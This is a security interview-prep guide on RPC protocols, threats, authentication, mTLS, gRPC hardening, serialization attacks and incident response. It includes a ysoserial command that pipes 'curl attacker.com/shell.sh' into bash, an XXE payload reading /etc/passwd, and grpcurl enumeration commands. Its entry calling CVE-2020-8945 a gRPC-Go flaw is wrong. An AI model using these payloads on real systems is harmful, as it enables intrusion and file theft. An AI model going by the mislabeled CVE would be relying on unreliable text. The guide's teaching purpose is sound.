# 🔐 RPC Security: Zero to Hero

> A comprehensive guide covering protocol fundamentals, attack vectors, authentication patterns, real-world vulnerabilities, and hardening — tailored for Security Engineer interview prep.

---

## Table of Contents

1. [What Is RPC? Protocol Fundamentals](#1-what-is-rpc-protocol-fundamentals)
2. [RPC Variants & Their Security Models](#2-rpc-variants--their-security-models)
3. [Attack Surface & Threat Landscape](#3-attack-surface--threat-landscape)
4. [Authentication & Authorization](#4-authentication--authorization)
5. [Transport Security — TLS & mTLS](#5-transport-security--tls--mtls)
6. [gRPC Security Deep Dive](#6-grpc-security-deep-dive)
7. [Input Validation & Serialization Attacks](#7-input-validation--serialization-attacks)
8. [Rate Limiting, DoS & Abuse Prevention](#8-rate-limiting-dos--abuse-prevention)
9. [Observability, Logging & Incident Response](#9-observability-logging--incident-response)
10. [Real-World Vulnerabilities & CVEs](#10-real-world-vulnerabilities--cves)
11. [Hardening Checklist & Best Practices](#11-hardening-checklist--best-practices)
12. [Interview Questions & Model Answers](#12-interview-questions--model-answers)

---

## 1. What Is RPC? Protocol Fundamentals

**Remote Procedure Call (RPC)** is a protocol that allows a program to execute a procedure (function) on a remote server as if it were a local call. The client sends a request with the procedure name and arguments; the server executes it and returns the result.

### Core Architecture

```
Client Stub → Serialize params → Transport (TCP/HTTP) → Deserialize → Server Stub → Execute procedure → Serialize result → Transport → Client receives result
```

### Key Components

| Component | Role | Security Relevance |
|-----------|------|-------------------|
| **Client Stub** | Marshals arguments, sends request | Input validation, serialization safety |
| **Transport Layer** | TCP, HTTP/2, Unix sockets | Encryption, integrity, authentication |
| **Server Stub** | Unmarshals, dispatches to handler | Deserialization attacks, access control |
| **IDL (Interface Definition)** | Defines service contract (.proto, WSDL) | Schema enforcement, type safety |
| **Service Registry** | Discovers available services | Service spoofing, registry poisoning |

### Why RPC Security Matters

- RPC is the backbone of **microservices communication** — a breach here is lateral movement
- Internal RPC often runs with **implicit trust** (no auth), creating a soft interior
- Binary protocols (gRPC/Thrift) are harder to inspect than REST, creating security blind spots
- RPC frameworks handle serialization automatically — devs often forget it's an attack surface

---

## 2. RPC Variants & Their Security Models

| Protocol | Encoding | Transport | Auth Built-in? | TLS Support |
|----------|----------|-----------|---------------|-------------|
| **gRPC** | Protobuf (binary) | HTTP/2 | Yes (interceptors) | Native TLS + mTLS |
| **JSON-RPC** | JSON (text) | HTTP, WebSocket | No | Via HTTPS |
| **XML-RPC** | XML (text) | HTTP | No | Via HTTPS |
| **SOAP** | XML (text) | HTTP, SMTP | WS-Security | Yes + message-level |
| **Apache Thrift** | Binary/Compact | TCP, HTTP | SASL support | Optional |
| **ONC/Sun RPC** | XDR (binary) | TCP/UDP | AUTH_SYS, Kerberos | No (legacy) |
| **DCE/RPC** | NDR (binary) | TCP (port 135+) | NTLM, Kerberos | Packet privacy |
| **Java RMI** | Java Serialization | JRMP/TCP | Security Manager | SSL optional |
| **Twirp** | Protobuf or JSON | HTTP/1.1 | No (via middleware) | Via HTTPS |

### Most Secure by Default

- **gRPC** — typed schemas, HTTP/2, native TLS/mTLS, interceptor chain for auth. The gold standard for modern RPC.
- **SOAP + WS-Security** — message-level encryption & signing (XML Signature, XML Encryption). Overkill but thorough.

### Least Secure by Default

- **ONC/Sun RPC** — AUTH_SYS trusts client-provided UIDs. No encryption. NFS (NFSv3) runs on this.
- **Java RMI** — Java deserialization = instant RCE if untrusted input reaches the server. Extremely dangerous.

### What FAANG Actually Uses

- **Google:** gRPC everywhere (they created it). Internal: Stubby → external: gRPC
- **Facebook/Meta:** Apache Thrift (they created it). fbthrift for internal services
- **Amazon:** Custom RPC (Coral framework) + gRPC for external APIs
- **Netflix:** gRPC for inter-service; historically used Ribbon + Eureka
- **Microsoft:** gRPC for Azure services; legacy DCE/RPC (Windows RPC)

---

## 3. Attack Surface & Threat Landscape

### RPC Attack Taxonomy

| Layer | Attack | Severity | Description |
|-------|--------|----------|-------------|
| Transport | Eavesdropping / MITM | 🔴 Critical | Unencrypted RPC traffic intercepted on the wire |
| Transport | TLS Downgrade | 🟠 High | Forcing fallback to plaintext or weaker cipher |
| Auth | Missing Authentication | 🔴 Critical | Internal RPC services with no auth checks |
| Auth | Broken Authorization | 🔴 Critical | IDOR — calling procedures with others' resource IDs |
| Auth | Token/Credential Theft | 🟠 High | Stealing JWT/API keys from metadata/headers |
| Serialization | Deserialization RCE | 🔴 Critical | Malicious payloads trigger code execution (Java RMI, Python pickle) |
| Serialization | Protobuf Confusion | 🟡 Medium | Type confusion via unknown fields or schema mismatch |
| Input | Parameter Tampering | 🟠 High | Modifying RPC params to access unauthorized data |
| Input | Injection via RPC args | 🟠 High | SQL/command injection passed through RPC fields |
| Availability | RPC Flood / DDoS | 🟠 High | Overwhelming server with rapid RPC calls |
| Availability | Resource Exhaustion | 🟠 High | Large messages, streaming abuse, connection hogging |
| Discovery | Service Enumeration | 🟡 Medium | Listing all available RPCs via reflection/introspection |
| Discovery | Registry Poisoning | 🟠 High | Spoofing service discovery to redirect traffic |

### Attack Flow: Lateral Movement via RPC

```
🎯 Compromise web frontend
    → 🔍 Enumerate internal RPCs
        → 🔓 Find unauthenticated RPC service
            → 💉 Call privileged procedure
                → 💀 Access DB / secrets / PII
```

> ⚠️ **Critical Insight for Interviews:** The #1 RPC vulnerability in microservices is **implicit trust between internal services**. Many orgs encrypt external traffic (TLS at the load balancer) but run **plaintext, unauthenticated RPC internally**. An attacker who compromises one service can call any internal RPC. This is why **zero-trust architecture** and **service mesh** (Istio, Linkerd) are essential — they enforce mTLS and authorization between every service pair.

---

## 4. Authentication & Authorization

### Authentication Mechanisms for RPC

#### 1. Mutual TLS (mTLS) — Identity at the Transport Layer

Both client and server present X.509 certificates. The TLS handshake verifies identity *before* any RPC call. Used heavily in service meshes.

- **Pros:** Strong identity, no tokens to steal, transparent to application code
- **Cons:** Certificate management at scale is complex, requires PKI infrastructure
- **Who uses it:** Google (ALTS), Istio, Linkerd, AWS App Mesh

#### 2. Token-Based (JWT / OAuth2)

Client obtains a signed token from an auth server, passes it as RPC metadata. Server validates signature and claims.

```go
// gRPC: Attach token via metadata
metadata := metadata.Pairs("authorization", "Bearer " + token)
ctx := metadata.NewOutgoingContext(ctx, metadata)
```

- **Pros:** Stateless, carries authorization claims, works across trust boundaries
- **Cons:** Token theft risk, revocation lag, size limits in metadata
- **Best practice:** Short-lived tokens (5-15 min) + refresh mechanism

#### 3. API Keys

Simple but limited — no identity claims, no expiration logic, often leaked in logs. Only use for non-sensitive, rate-limited public APIs.

#### 4. SPIFFE/SPIRE — Workload Identity

**SPIFFE** (Secure Production Identity Framework For Everyone) provides cryptographic identity to workloads. **SPIRE** is the reference implementation. Each workload gets a SVID (SPIFFE Verifiable Identity Document) — an X.509 cert or JWT with a SPIFFE ID like:

```
spiffe://cluster.local/ns/payments/sa/checkout
```

This decouples identity from network location — critical for Kubernetes, multi-cloud.

### Authorization Patterns

| Pattern | How It Works | Best For |
|---------|-------------|----------|
| **RBAC** | Roles mapped to allowed procedures | Simple service hierarchies |
| **ABAC** | Policies on attributes (service, method, time) | Complex, dynamic rules |
| **OPA (Open Policy Agent)** | Centralized policy engine, Rego language | FAANG-scale microservices |
| **Service Mesh Policies** | Istio AuthorizationPolicy, Linkerd policy | Kubernetes environments |
| **Per-RPC ACLs** | Allowlist of callers per procedure | High-security internal services |

```rego
// Example: OPA policy for gRPC authorization
package grpc.authz

default allow = false

allow {
    input.method == "/payments.v1.PaymentService/ProcessPayment"
    input.caller_spiffe_id == "spiffe://prod/ns/checkout/sa/frontend"
    input.amount <= 10000
}
```

> 💡 **Key Principle:** Authentication answers "who are you?" — Authorization answers "what can you do?" Many RPC breaches happen because services authenticate but don't authorize at the procedure level. Always enforce *both*, and always authorize at the *individual RPC method* level, not just the service level.

---

## 5. Transport Security — TLS & mTLS

### TLS for RPC: The Basics

TLS (Transport Layer Security) provides three guarantees:

1. **Confidentiality** — Encrypted channel, eavesdropping-proof
2. **Integrity** — Tamper detection via MACs
3. **Authentication** — Server identity verified via certificate (+ client in mTLS)

### One-Way TLS vs. Mutual TLS (mTLS)

**One-Way TLS:**
- Client verifies server's certificate
- Server doesn't verify client identity
- Standard for client-facing APIs
- Client auth via token/API key

**Mutual TLS (mTLS):**
- Both sides present and verify certificates
- Cryptographic identity for both parties
- Standard for service-to-service RPC
- Required for zero-trust architecture

### mTLS Handshake for RPC

```
Client                                 Server
  |                                      |
  |------- ClientHello ----------------->|  (supported ciphers, TLS version)
  |<------ ServerHello + ServerCert -----|  (server sends its certificate)
  |<------ CertificateRequest ----------|  ★ Server requests client cert
  |------- ClientCert + KeyExchange --->|  ★ Client sends its certificate
  |------- Finished ------------------->|
  |<------ Finished --------------------|
  |                                      |
  |====== Encrypted RPC Channel ========|  Both identities verified!
```

### TLS Configuration Hardening — Common Misconfigurations

| Mistake | Impact | Fix |
|---------|--------|-----|
| TLS 1.0/1.1 enabled | Known vulnerabilities (POODLE, BEAST) | Enforce TLS 1.2+ minimum, prefer 1.3 |
| Self-signed certs in prod | No chain of trust validation | Use proper PKI / CA (internal or public) |
| Wildcard certs everywhere | Compromise one service = compromise all | Per-service certificates |
| No certificate rotation | Long-lived certs increase breach window | Auto-rotate (cert-manager, SPIRE) |
| `InsecureSkipVerify=true` | Client accepts ANY cert (MITM trivial) | Never disable verification in production |
| Weak cipher suites | Breakable encryption | Only AEAD ciphers (AES-GCM, ChaCha20) |

### Google ALTS (Application Layer Transport Security)

Google uses **ALTS** instead of TLS for internal RPC (Stubby/gRPC). Key differences from TLS:

- Uses Google's **protocol-independent handshake** protocol
- Identity based on **service accounts**, not hostnames
- Zero-configuration — automatically provisioned
- Supports **peer service account authorization** natively

```go
// gRPC with ALTS (Google Cloud)
import "google.golang.org/grpc/credentials/alts"

altsTC := alts.NewClientCreds(alts.DefaultClientOptions())
conn, _ := grpc.Dial(addr, grpc.WithTransportCredentials(altsTC))
```

---

## 6. gRPC Security Deep Dive

gRPC is the dominant RPC framework in modern systems. Understanding its security model deeply is essential.

### gRPC Security Architecture

| Layer | Security Feature | Implementation |
|-------|-----------------|----------------|
| Transport | TLS / mTLS / ALTS | `grpc.WithTransportCredentials()` |
| Per-Call | Token auth (JWT, OAuth2) | `grpc.WithPerRPCCredentials()` |
| Interceptor | Auth, rate-limit, logging | Unary + Stream interceptors |
| Channel | Channel credentials | Bound to connection lifecycle |
| Message | Protobuf schema enforcement | Code-generated stubs |

### gRPC Interceptors for Security

Interceptors are middleware that runs before/after every RPC call. This is where you implement cross-cutting security concerns.

```go
// Go: Server-side auth interceptor
func AuthInterceptor(
    ctx context.Context,
    req interface{},
    info *grpc.UnaryServerInfo,
    handler grpc.UnaryHandler,
) (interface{}, error) {
    // 1. Extract token from metadata
    md, ok := metadata.FromIncomingContext(ctx)
    if !ok {
        return nil, status.Error(codes.Unauthenticated, "no metadata")
    }
    tokens := md.Get("authorization")
    if len(tokens) == 0 {
        return nil, status.Error(codes.Unauthenticated, "missing token")
    }

    // 2. Validate token
    claims, err := validateJWT(tokens[0])
    if err != nil {
        return nil, status.Error(codes.Unauthenticated, "invalid token")
    }

    // 3. Check authorization for this specific method
    if !isAuthorized(claims, info.FullMethod) {
        return nil, status.Error(codes.PermissionDenied, "forbidden")
    }

    // 4. Add claims to context for downstream use
    ctx = context.WithValue(ctx, "claims", claims)
    return handler(ctx, req)
}
```

### gRPC Reflection — The Hidden Risk

> ⚠️ **Security Warning:** gRPC Server Reflection (`reflection.Register()`) exposes your entire service schema — every method, every message type. It's like leaving your API docs publicly accessible.

- Attackers use tools like `grpcurl` or `grpc_cli` to enumerate all methods
- Combined with missing auth → full unauthorized access to every RPC
- **Fix:** Disable reflection in production, or restrict it to authenticated admin calls

```bash
# Attacker enumeration via grpcurl
grpcurl -plaintext target:50051 list                    # List all services
grpcurl -plaintext target:50051 list myapp.UserService   # List all methods
grpcurl -plaintext target:50051 describe myapp.UserRequest  # Get field types
```

### gRPC Security Checklist

- [x] TLS enabled (never use `grpc.WithInsecure()` in production)
- [x] mTLS for service-to-service calls
- [x] Auth interceptor on every service
- [x] Per-method authorization checks
- [x] Reflection disabled in production
- [x] Keepalive settings configured (prevent idle connection abuse)
- [x] Max message size limits set (`grpc.MaxRecvMsgSize`)
- [x] Max concurrent streams limited
- [x] Deadline/timeout on every RPC call
- [x] Proper gRPC status codes (don't leak internals in error messages)

---

## 7. Input Validation & Serialization Attacks

### Deserialization = The Nuclear Weapon of RPC Attacks

When an RPC framework deserializes data, it converts bytes back into objects. If the format allows arbitrary code execution during deserialization, an attacker can craft a payload that runs malicious code on the server.

#### Vulnerable Serialization Formats

| Format | RCE Risk | Used In | Why Dangerous |
|--------|----------|---------|---------------|
| **Java Serialization** | 🔴 Critical | Java RMI, JMX | Arbitrary object instantiation, gadget chains |
| **Python pickle** | 🔴 Critical | Custom Python RPC | `__reduce__` method executes arbitrary code |
| **PHP serialize** | 🟠 High | Legacy PHP APIs | Object injection via magic methods |
| **YAML (unsafe load)** | 🟠 High | Config-based RPC | `!!python/object` tags execute code |
| **XML (with DTD)** | 🟠 High | XML-RPC, SOAP | XXE: read files, SSRF, DoS (billion laughs) |

#### Safe Serialization Formats

| Format | RCE Risk | Used In | Why Safe |
|--------|----------|---------|----------|
| **Protobuf** | None* | gRPC | Schema-driven, no code execution in format |
| **FlatBuffers** | None | Game engines, ML | Zero-copy, no deserialization step |
| **JSON** | None* | JSON-RPC, REST | Data-only format (*unless eval'd) |
| **MessagePack** | None | Custom RPC | Binary JSON, no code execution |

### Java Deserialization — The Classic RPC RCE

```bash
# Using ysoserial to exploit Java RMI
java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/shell.sh | bash' > payload.ser

# Send crafted serialized object to RMI endpoint
# Server deserializes → gadget chain triggers → RCE achieved
```

**Mitigation:** Use allowlist-based deserialization filters (JEP 290), or switch to Protobuf/JSON entirely.

### XML External Entity (XXE) in XML-RPC/SOAP

```xml
<!-- XXE payload in XML-RPC request -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<methodCall>
  <methodName>getUserInfo</methodName>
  <params><param><value>&xxe;</value></param></params>
</methodCall>
```

**Fix:** Disable DTD processing entirely. In Java:
```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

### Protobuf Security Considerations

While Protobuf doesn't allow RCE, it has its own concerns:

- **Unknown fields:** Protobuf silently ignores unknown fields — attackers can probe for schema changes
- **Default values:** Missing fields get defaults (0, "", false) — this can bypass validation
- **Large messages:** No built-in size limit — can cause OOM
- **Nested messages:** Deep nesting can cause stack overflow during parsing

---

## 8. Rate Limiting, DoS & Abuse Prevention

### RPC-Specific DoS Vectors

| Attack | Mechanism | Mitigation |
|--------|-----------|------------|
| **RPC Flood** | Overwhelm server with rapid calls | Rate limiting per client identity |
| **Large Message** | Send huge payloads (GB-sized protobuf) | Max message size limits |
| **Stream Abuse** | Open thousands of gRPC streams | Max concurrent streams per connection |
| **Slowloris RPC** | Send data byte-by-byte, hold connections | Timeouts, keepalive enforcement |
| **Recursive Message** | Deeply nested protobuf → stack overflow | Max recursion depth in parser |
| **Compression Bomb** | Tiny compressed → huge decompressed | Limit decompressed message size |
| **Deadline Abuse** | Set very long deadlines, hog resources | Server-side max deadline enforcement |

### Rate Limiting Strategies

**Per-Method Rate Limiting** — Different RPCs have different costs:

```go
// Rate limits per method
limits := map[string]rate.Limit{
  "/users.v1/ListUsers":     100,  // /sec
  "/payments.v1/Process":     10,  // /sec
  "/admin.v1/DeleteAccount":   1,  // /sec
}
```

**Adaptive Rate Limiting:**
- **Token bucket** — smooth burst handling
- **Sliding window** — precise rate tracking
- **Circuit breaker** — cut off cascading failures
- **Load shedding** — reject low-priority RPCs first

### gRPC-Specific Hardening

```go
// Go: gRPC server with resource limits
server := grpc.NewServer(
    grpc.MaxRecvMsgSize(4 * 1024 * 1024),           // 4MB max message
    grpc.MaxSendMsgSize(4 * 1024 * 1024),
    grpc.MaxConcurrentStreams(100),                    // Limit streams per connection
    grpc.KeepaliveParams(keepalive.ServerParameters{
        MaxConnectionIdle:     15 * time.Minute,       // Close idle connections
        MaxConnectionAge:      30 * time.Minute,       // Force reconnection
        MaxConnectionAgeGrace: 5 * time.Second,
        Time:                  5 * time.Minute,        // Ping interval
        Timeout:               1 * time.Second,        // Ping timeout
    }),
    grpc.KeepaliveEnforcementPolicy(keepalive.EnforcementPolicy{
        MinTime:             5 * time.Second,          // Min allowed ping interval
        PermitWithoutStream: false,                    // No pings on idle conn
    }),
)
```

---

## 9. Observability, Logging & Incident Response

### What to Log for RPC Security

| Event | Log Fields | Why |
|-------|-----------|-----|
| Auth failure | caller_id, method, error, source_ip | Detect brute force, credential stuffing |
| Authz denial | caller_id, requested_method, policy_violated | Detect privilege escalation attempts |
| Rate limit hit | caller_id, method, current_rate, limit | Detect abuse patterns, DDoS |
| Large message | caller_id, method, size_bytes | Detect DoS via payload size |
| Deserialization error | caller_id, method, error_type | Detect fuzzing, injection attempts |
| Cert validation failure | peer_ip, cert_subject, error | Detect MITM, expired certs |
| Unusual method access | caller_id, method, historical_pattern | Anomaly detection |

> ⚠️ **Critical Rule:** Never log sensitive RPC payloads. Request/response bodies may contain PII, credentials, or financial data. Log metadata (method, status, latency, size) but redact or skip message bodies. Use structured logging with explicit field allowlists.

### Security Monitoring Metrics

- `grpc_server_handled_total{code="Unauthenticated"}` — auth failures per service
- `grpc_server_handled_total{code="PermissionDenied"}` — authz failures
- `grpc_server_msg_received_bytes` — detect abnormal message sizes
- `grpc_server_handling_seconds` — detect slowloris / resource exhaustion
- **Alert on:** Spike in auth failures, new caller accessing sensitive methods, unusual traffic patterns

### Distributed Tracing for RPC

In microservices, one user request triggers chains of RPC calls. Use distributed tracing (OpenTelemetry, Jaeger) to:

- Trace the full call chain from edge to database
- Identify which service in the chain was compromised
- Correlate security events across services
- Propagate trace context via gRPC metadata — ensuring security logs can be correlated

---

## 10. Real-World Vulnerabilities & CVEs

### CVE-2023-44487 — HTTP/2 Rapid Reset (gRPC DDoS)

**Severity:** 🔴 Critical | **CVSS:** 7.5

Attackers discovered they could open and immediately cancel HTTP/2 streams at massive scale. Since gRPC runs on HTTP/2, every gRPC server was affected. The server processes the stream setup but the RST_STREAM cancel arrives before cleanup — causing resource exhaustion. **Exploited in the wild** against Google, Cloudflare, and AWS.

**Fix:** Rate limit RST_STREAM frames; limit stream creation rate; update HTTP/2 libraries.

### MS-RPC / PrintNightmare (CVE-2021-34527)

**Severity:** 🔴 Critical | **CVSS:** 8.8

Windows Print Spooler service exposed via DCE/RPC. Attackers could call `RpcAddPrinterDriverEx()` to load arbitrary DLLs — achieving RCE as SYSTEM on any Windows machine with the spooler running. Classic case of a powerful RPC method with insufficient authorization.

### Java RMI Deserialization (Multiple CVEs)

**Severity:** 🔴 Critical

Apache Commons Collections "gadget chains" allowed RCE via Java deserialization. Affects any Java RPC using native serialization — RMI, JMX, custom frameworks. Tools like `ysoserial` automate exploitation. Led to industry-wide shift toward schema-based serialization (Protobuf, JSON).

### CVE-2020-8945 — gRPC-Go Memory Corruption

**Severity:** 🟠 High

A use-after-free vulnerability in the Go gRPC library's GPG signature verification. Crafted messages could trigger memory corruption. Demonstrates that even "safe" languages have vulnerability surfaces in native code dependencies.

### NFS/Sun RPC AUTH_SYS Bypass

**Severity:** 🔴 Critical

NFS v3 uses Sun RPC with AUTH_SYS — where the *client* tells the server its UID/GID. An attacker simply sets UID=0 in the RPC header to become root. No cryptographic verification. Still found in many NFS deployments. Fix: Use Kerberos (AUTH_RPCSEC_GSS) or NFSv4+ with proper auth.

---

## 11. Hardening Checklist & Best Practices

### 🔒 Transport Layer

- [ ] TLS 1.3 (minimum 1.2) on all RPC endpoints
- [ ] mTLS for all service-to-service communication
- [ ] AEAD cipher suites only (AES-256-GCM, ChaCha20-Poly1305)
- [ ] Certificate auto-rotation (< 90 day lifetime)
- [ ] Never set InsecureSkipVerify / grpc.WithInsecure() in production
- [ ] Pin CA certificates in client configs

### 🔑 Authentication & Authorization

- [ ] Every RPC endpoint requires authentication (no implicit trust)
- [ ] Per-method authorization (not just per-service)
- [ ] Short-lived tokens (5-15 min) with refresh
- [ ] SPIFFE/SPIRE for workload identity in Kubernetes
- [ ] OPA or equivalent for centralized policy management
- [ ] Audit log all auth decisions

### 📦 Input & Serialization

- [ ] Never use Java native serialization for RPC
- [ ] Never deserialize pickle/YAML from untrusted sources
- [ ] Disable XML DTD processing (prevent XXE)
- [ ] Use schema-based serialization (Protobuf, FlatBuffers)
- [ ] Validate all fields server-side (don't trust client schemas)
- [ ] Set max message size and recursion depth

### 🛡️ Availability & Resilience

- [ ] Rate limiting per caller, per method
- [ ] Max concurrent streams and connections
- [ ] Deadlines/timeouts on every RPC call
- [ ] Circuit breakers between services
- [ ] Keepalive configuration to prevent connection hogging
- [ ] Graceful degradation under load

### 📡 Observability & Operations

- [ ] Structured logging of all security events
- [ ] Distributed tracing across RPC call chains
- [ ] Alert on auth failure spikes and anomalous patterns
- [ ] Disable gRPC reflection in production
- [ ] Regular dependency updates (HTTP/2 libraries, gRPC frameworks)
- [ ] Penetration testing of RPC endpoints

### 🏗️ Architecture

- [ ] Zero-trust: assume the network is compromised
- [ ] Service mesh (Istio/Linkerd) for transparent mTLS + policy
- [ ] Separate internal and external RPC endpoints
- [ ] API gateway for external RPC access (envoy proxy)
- [ ] Network segmentation — limit blast radius
- [ ] Secrets management (Vault) — never hardcode certs/keys

---

## 12. Interview Questions & Model Answers

### Q1: How would you secure gRPC communication between microservices in a Kubernetes environment?

**Model Answer:** I'd implement a layered approach:

1. **Transport:** Deploy a service mesh (Istio) to automatically enforce mTLS between all pods. This gives us encrypted, authenticated channels without code changes.
2. **Identity:** Use SPIFFE/SPIRE for cryptographic workload identity. Each service gets a short-lived SVID tied to its Kubernetes service account.
3. **Authentication:** gRPC interceptors validate JWT tokens for user-facing calls, and mTLS certificates for service-to-service calls.
4. **Authorization:** OPA sidecar with Rego policies for per-method authorization. Istio AuthorizationPolicy as a second layer.
5. **Input safety:** Protobuf schemas enforce type safety. Max message size set to 4MB. Server-side validation on all fields.
6. **Observability:** OpenTelemetry for distributed tracing, Prometheus metrics for auth failure rates, alerts on anomalies.
7. **Resilience:** Circuit breakers (Envoy), rate limiting per caller/method, mandatory deadlines on all RPCs.

### Q2: An attacker has compromised a frontend pod. How could they exploit internal RPC services, and how would you prevent it?

**Model Answer:** Attack vectors from a compromised pod:

- **Enumeration:** Use gRPC reflection to discover all internal services and methods. *Prevention: disable reflection in prod.*
- **Lateral movement:** Call internal RPCs directly if no auth. *Prevention: mTLS + per-method authz.*
- **Credential theft:** Read JWT tokens from memory/env vars. *Prevention: short-lived tokens, bound to source service identity.*
- **Privilege escalation:** Call admin RPCs with the frontend's identity. *Prevention: least-privilege RBAC — frontend can only call its required RPCs.*
- **Data exfiltration:** Query data services for bulk PII. *Prevention: rate limiting, field-level authorization, DLP policies.*

Defense in depth: even with one pod compromised, the blast radius is contained by network policies, mTLS identity binding, and per-method authorization.

### Q3: You see a spike in PermissionDenied errors from an internal service. Walk me through your investigation.

**Model Answer:**

1. **Triage:** Check which service is generating errors (Grafana dashboard → `grpc_server_handled_total{code="PermissionDenied"}`). Identify the caller and target method.
2. **Correlate:** Use distributed tracing to find the full call chain. Check if the caller is legitimate or compromised.
3. **Analyze:** Review the OPA audit log — what policy is being denied? Is this a misconfiguration (new deployment with wrong role) or an attack (compromised service probing)?
4. **Assess:** Check if the caller is accessing methods outside its normal pattern. Compare against baseline behavior.
5. **Respond:** If attack — isolate the pod (network policy), revoke its SVID, trigger incident response. If misconfig — fix the policy, verify with staging, deploy.
6. **Prevent:** Update monitoring to catch this pattern earlier. Add canary policies to detect probing.

### Q4: Compare the security of gRPC vs. REST APIs. When would you choose each?

**Model Answer:**

| Aspect | gRPC | REST |
|--------|------|------|
| Schema enforcement | Strict (Protobuf compiled) | Loose (OpenAPI optional) |
| Type safety | Strong (code-generated) | Weak (JSON parsing) |
| Transport | HTTP/2 (mandatory) | HTTP/1.1 or 2 |
| Auth patterns | Interceptor chain, mTLS native | Middleware, bearer tokens |
| Inspection | Binary → harder to WAF/inspect | Text → easy to inspect/log |
| Attack surface | Smaller (typed, compiled) | Larger (injection, parser bugs) |

**Choose gRPC** for internal service-to-service (performance, type safety, mTLS). **Choose REST** for external/public APIs (wider tooling, easier inspection, WAF compatibility). In practice, use an API gateway that translates REST↔gRPC at the boundary.

### Q5: Explain how deserialization attacks work against RPC systems, and how would you prevent them across a large organization?

**Model Answer:** Deserialization attacks exploit formats that allow code execution during object reconstruction. Classic example: Java RMI uses native serialization — an attacker sends a crafted object with a "gadget chain" (sequence of existing class methods) that triggers arbitrary command execution when deserialized.

**Prevention at scale:**

1. **Ban dangerous formats:** Policy prohibiting Java native serialization, Python pickle, unsafe YAML in any RPC system. Enforce via CI/CD scanning.
2. **Mandate safe formats:** Protobuf or JSON only. gRPC as the standard framework.
3. **Defense in depth:** Even with safe formats, validate all deserialized data. Set max message sizes. Use deserialization filters (JEP 290 for Java).
4. **Legacy migration:** Identify all Java RMI/SOAP endpoints. Create migration roadmap to gRPC. In the interim, add JEP 290 allowlist filters.
5. **Detection:** Monitor for deserialization errors (could indicate fuzzing). Scan dependencies for known gadget chain libraries.

---

*🔐 RPC Security: Zero to Hero — Prepared for Gayatri Rachakonda*
*FAANG Security Engineer Interview Prep Series • April 2026*
